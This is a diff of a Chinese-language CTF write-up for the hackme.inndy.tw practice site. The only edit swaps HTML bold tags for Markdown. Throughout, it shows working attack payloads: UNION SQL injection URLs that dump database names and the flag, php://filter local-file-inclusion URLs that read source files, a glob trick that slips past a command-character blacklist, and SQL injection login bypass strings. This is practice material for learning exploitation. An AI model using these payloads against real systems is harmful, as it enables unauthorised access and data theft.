@@ -9,24 +9,24 @@
 
 ### 0x02 guestbook
 https://hackme.inndy.tw/gb/?mod=read&id=46
-<b>Payload 1:</b> 取得資料庫名 g8
+**Payload 1:** 取得資料庫名 g8
 `https://hackme.inndy.tw/gb/?mod=read&id=-1 union select 1,2,(database()),4#`
-<b>Payload 2:</b> 得到資料庫表名 flag
+**Payload 2:** 得到資料庫表名 flag
 `https://hackme.inndy.tw/gb/?mod=read&id=-1 union select 1,2,(select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA='g8' limit 0,1),4#`
-<b>Payload 3:</b> 得到資料庫列名 flag
+**Payload 3:** 得到資料庫列名 flag
 `https://hackme.inndy.tw/gb/?mod=read&id=-1 union select 1,2,(select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME='flag' limit 1,1),4#`
-<b>Payload 4:</b> 拿到該題 `flag`
+**Payload 4:** 拿到該題 `flag`
 `https://hackme.inndy.tw/gb/?mod=read&id=-1 union select 1,2,(select flag from flag limit 1,1),4#`
 
 ### 0x03 LFI
 #### https://hackme.inndy.tw/lfi/?page=pages/index
-<b>Payload 1:</b>
+**Payload 1:**
 `https://hackme.inndy.tw/lfi/?page=php://filter/read=convert.base64-encode/resource=pages/flag`
 base64 decode 後得到 flag.php
 ``` php
 Can you read the flag<?php require('config.php'); ?>?
 ```
-<b>Payload 2:</b>
+**Payload 2:**
 `https://hackme.inndy.tw/lfi/?page=php://filter/read=convert.base64-encode/resource=pages/config`
 base64 decode 後得到 config.php
 ``` php
@@ -57,13 +57,13 @@ $blacklist = [
             '/', '&', '|', '>', '<', ';', '"', '\'', '\\', "\n"
         ];
 ```
-<b>Payload:</b>
+**Payload:**
 `sort fl????hp`
 
 
 ### 0x06 scoreboard
 #### https://hackme.inndy.tw/scoreboard/
-<b>Payload:</b> X-Flag 就是 flag
+**Payload:** X-Flag 就是 flag
 `curl -I https://hackme.inndy.tw/scoreboard/`
 
 ### 0x07 login as admin 0
@@ -81,12 +81,12 @@ function safe_filter($str)
     return str_replace("'", "\\'", $str);
 }
 ```
-<b>Payload 1:</b> 得到 guest
+**Payload 1:** 得到 guest
 ``` 
 username = \' || 1#
 password = 1
 ```
-<b>Payload 2:</b> 得到 admin & flag
+**Payload 2:** 得到 admin & flag
 ``` 
 username = \' || 1 limit 1,1#
 password = 1
